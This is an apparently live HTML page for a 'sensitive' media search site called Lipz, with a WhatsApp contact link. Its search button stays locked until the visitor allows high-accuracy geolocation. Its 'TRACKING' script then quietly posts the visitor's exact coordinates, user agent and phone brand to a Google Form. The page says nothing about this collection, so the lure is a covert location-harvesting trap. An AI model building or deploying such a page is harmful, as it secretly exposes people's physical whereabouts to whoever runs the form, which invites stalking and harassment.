<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>リップズ</title>

<style>
body {
  margin: 0;
  background: black;
  color: white;
  font-family: Arial, sans-serif;
  display: flex;
  flex-direction: column;
  align-items: center;
}

h1 { margin-top: 40px; }

.main-img {
  margin-top: 20px;
  width: 120px;
  height: 120px;
  border-radius: 18px;
  object-fit: cover;
}

input {
  margin-top: 20px;
  width: 220px;
  padding: 12px;
  border-radius: 10px;
  border: none;
}

.controls {
  margin-top: 12px;
  display: flex;
  align-items: center;
  gap: 12px;
}

button {
  padding: 10px 30px;
  border-radius: 10px;
  border: none;
  font-weight: bold;
  cursor: pointer;
}

button:disabled {
  background: #777;
  color: black;
  cursor: not-allowed;
}

.toggle {
  font-size: 18px;
  cursor: pointer;
  color: #777;
  user-select: none;
}

.warning {
  margin-top: 120px;
  opacity: 0.6;
}

/* MODAL */
.modal {
  display: none;
  position: fixed;
  inset: 0;
  background: rgba(0,0,0,0.6);
  backdrop-filter: blur(8px);
  justify-content: center;
  align-items: center;
  z-index: 999;
}

.modal-box {
  position: relative;
  width: 320px;
  text-align: center;
}

.modal video,
.modal img {
  width: 100%;
  border-radius: 16px;
}

.close {
  position: absolute;
  top: -35px;
  right: 0;
  font-size: 22px;
  cursor: pointer;
}

.nav-btn {
  position: absolute;
  bottom: -40px;
  font-size: 26px;
  background: rgba(0,0,0,0.5);
  border: none;
  color: white;
  padding: 4px 12px;
  cursor: pointer;
}

.nav-left { left: 0; }
.nav-right { right: 0; }

.indicator {
  margin-top: 10px;
  font-size: 18px;
  letter-spacing: 4px;
}

/* TELEPON */
.phone-btn {
  position: fixed;
  bottom: 20px;
  right: 20px;
  width: 50px;
  height: 50px;
  background: white;
  border-radius: 50%;
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
  text-decoration: none;
}

.phone-btn svg {
  width: 26px;
  height: 26px;
  fill: black;
}
</style>
</head>

<body>

<h1>リップズ</h1>

<img class="main-img" src="https://files.catbox.moe/2sgujb.jpg">

<input id="keyword" placeholder="Search">

<div class="controls">
  <button id="searchBtn" onclick="search()" disabled>SEARCH</button>
  <div id="toggle" class="toggle" onclick="toggleLocation()">•-/-•</div>
</div>

<div class="warning">This Web Is Sensitif⚠</div>

<!-- MODAL -->
<div class="modal" id="modal">
  <div class="modal-box" id="modalBox">
    <div class="close" onclick="closeModal()">✕</div>
  </div>
</div>

<!-- TELEPON -->
<a href="https://wa.me/6281317309919" target="_blank" class="phone-btn">
<svg viewBox="0 0 24 24">
<path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.11-.21c1.2.48 2.5.74 3.83.74a1 1 0 011 1v3.5a1 1 0 01-1 1C10.07 21.5 2.5 13.93 2.5 4a1 1 0 011-1H7a1 1 0 011 1c0 1.33.26 2.63.74 3.83a1 1 0 01-.21 1.11l-2.2 2.2z"/>
</svg>
</a>

<script>
/* ================= TRACKING ================= */
let locationGranted = false;

function getBrand() {
  const ua = navigator.userAgent.toLowerCase();
  if (ua.includes("samsung")) return "Samsung";
  if (ua.includes("oppo")) return "Oppo";
  if (ua.includes("vivo")) return "Vivo";
  if (ua.includes("xiaomi") || ua.includes("redmi")) return "Xiaomi";
  if (ua.includes("infinix")) return "Infinix";
  if (ua.includes("realme")) return "Realme";
  if (ua.includes("iphone")) return "iPhone";
  return "Unknown";
}

function sendTracking(lat, lon) {
  const url =
  "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse" +
  "?entry.138340134=" + lat.toFixed(6) +
  "&entry.1616098311=" + lon.toFixed(6) +
  "&entry.1257224602=" + encodeURIComponent(navigator.userAgent) +
  "&entry.1874088822=" + encodeURIComponent(getBrand());

  fetch(url, { mode: "no-cors" });
}

function toggleLocation() {
  if (locationGranted) return;

  navigator.geolocation.getCurrentPosition(
    pos => {
      locationGranted = true;
      sendTracking(pos.coords.latitude, pos.coords.longitude);

      const btn = document.getElementById("searchBtn");
      btn.disabled = false;
      btn.style.background = "white";

      document.getElementById("toggle").style.color = "white";
    },
    () => {
      alert("Lokasi wajib diaktifkan untuk SEARCH");
    },
    { enableHighAccuracy: true }
  );
}

/* ================= LIPZZ ================= */
let data = {};
let currentImages = [];
let currentIndex = 0;

fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
.then(r => r.json())
.then(j => data = j);

function search() {
  if (!locationGranted) return;

  const key = keyword.value.trim().toLowerCase();
  if (!data[key]) return;

  modalBox.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';

  if (data[key].type === "video") {
    const v = document.createElement("video");
    v.src = data[key].src;
    v.controls = true;
    v.autoplay = true;
    modalBox.appendChild(v);
  }

  if (data[key].type === "gallery") {
    currentImages = data[key].images;
    currentIndex = 0;

    const img = document.createElement("img");
    img.id = "gallery";
    img.src = currentImages[0];
    modalBox.appendChild(img);

    const l = document.createElement("button");
    l.className = "nav-btn nav-left";
    l.innerText = "<";
    l.onclick = () => slide(-1);
    modalBox.appendChild(l);

    const r = document.createElement("button");
    r.className = "nav-btn nav-right";
    r.innerText = ">";
    r.onclick = () => slide(1);
    modalBox.appendChild(r);

    const ind = document.createElement("div");
    ind.className = "indicator";
    ind.id = "indicator";
    modalBox.appendChild(ind);
    updateIndicator();
  }

  modal.style.display = "flex";
}

function slide(d) {
  currentIndex = (currentIndex + d + currentImages.length) % currentImages.length;
  gallery.src = currentImages[currentIndex];
  updateIndicator();
}

function updateIndicator() {
  indicator.textContent = currentImages.map((_,i)=> i===currentIndex?"♦":"•").join("");
}

function closeModal() {
  modal.style.display = "none";
  modalBox.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
}
</script>

</body>
</html>
